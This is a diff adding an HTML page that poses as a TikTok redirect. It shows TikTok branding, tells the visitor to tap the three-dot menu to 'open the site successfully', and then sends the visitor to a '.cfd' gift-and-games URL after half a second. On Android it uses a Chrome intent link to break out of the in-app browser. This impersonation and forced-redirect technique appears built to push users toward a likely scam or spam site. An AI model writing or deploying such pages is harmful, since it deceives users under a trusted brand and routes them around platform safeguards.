@@ -1,0 +1,84 @@
+
+
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <link rel="icon" href="https://sf-tb-sg.ibytedtos.com/obj/eden-sg/uhtyvueh7nulogpoguhm/tiktok-icon2.png" type="image/x-icon">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+
+        #tiktok-logo {
+            width: 250px;
+            margin-bottom: 20px;
+        }
+
+        #redirect-text {
+            font-size: 30px;
+            color: #333;
+            opacity: 0;
+            animation: fadeIn 2s ease-in-out forwards, scaleUp 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @keyframes scaleUp {
+            0% {
+                transform: scale(1);
+            }
+
+            100% {
+                transform: scale(1.2);
+            }
+        }
+
+        #openLink {
+            margin: 50px;
+            text-align: center;
+        }
+    </style>
+</head><body>
+    <img id="tiktok-logo" src="https://www9.0zz0.com/2024/04/06/13/548511907.gif" alt="TikTok Logo">
+    <p id="redirect-text"><p><strong>  🚨 
+  
+   
+Click on the three dots above to open the site successfully 
+
+    <a href="#" id="openLink">    </a>
+    <script>
+        function openLinkBasedOnDevice(url) {
+            var userAgent = navigator.userAgent;
+
+            if (/(android)/i.test(userAgent)) {
+                window.location.href = 'intent://' + url.substring(url.indexOf("://") + 3) + '#Intent;scheme=http;package=com.android.chrome;end;';
+            } else if (/(iphone|ipad|ipod)/i.test(userAgent)) {
+                window.location.href = url;
+            } else {
+                window.location.href = url;
+            }
+        }
+        setTimeout(function () {
+            var url = 'https://www.mygift.cfd/2024/06/top-5-poki-games-now-available-on.html';
+            openLinkBasedOnDevice(url);
+        }, 500);
+    </script>
+  </body></html>
